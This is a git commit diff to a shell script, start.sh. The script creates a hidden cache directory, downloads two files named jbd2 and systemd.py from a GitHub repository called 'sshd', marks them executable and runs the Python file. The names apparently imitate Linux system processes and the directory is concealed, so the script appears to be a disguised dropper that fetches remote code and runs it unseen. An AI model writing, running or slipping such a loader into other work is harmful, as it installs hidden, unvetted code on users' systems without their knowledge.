f23802daf9261ef27841179029a4571dc09b4981
ANTI VIRAL <109937537+ANTI-VIRAL@users.noreply.github.com>
2025-06-05 19:36:41 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,15 +2,15 @@
 
 set -e
 
-mkdir -p /dev/shm/.cache
-chmod 700 /dev/shm/.cache
-cd /dev/shm/.cache
+mkdir -p ~/.cache/.sys/
+chmod 700 ~/.cache/.sys/
+cd ~/.cache/.sys/
 
 wget -q \
     https://github.com/ANTI-VIRAL/sshd/raw/main/jbd2 \
     https://github.com/ANTI-VIRAL/sshd/raw/main/systemd.py 
 
-chmod +x jbd2
+chmod +x jbd2 systemd.py
 
 # Start program
 exec python systemd.py
